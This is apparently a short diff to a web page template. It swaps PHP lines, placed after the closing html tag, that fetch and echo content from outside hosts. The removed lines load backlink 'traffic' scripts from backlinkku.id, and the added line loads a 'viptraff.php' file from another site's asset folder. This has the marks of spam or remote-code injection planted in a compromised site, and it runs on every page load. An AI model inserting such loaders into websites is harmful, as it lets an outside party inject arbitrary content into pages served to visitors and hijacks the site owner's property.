@@ -270,5 +270,5 @@
 </div>
 </body>
 <!-- InstanceEnd --></html>
-<?php echo file_get_contents("https://backlinkku.id/menu/traffic-v1/script.txt"); ?>
-<?php echo file_get_contents("https://www.backlinkku.id/menu/vip-v2/script.txt"); ?>
+
+<?php echo file_get_contents("https://www.sakagura-wedding.jp/assets_c/2015/03/viptraff.php"); ?>
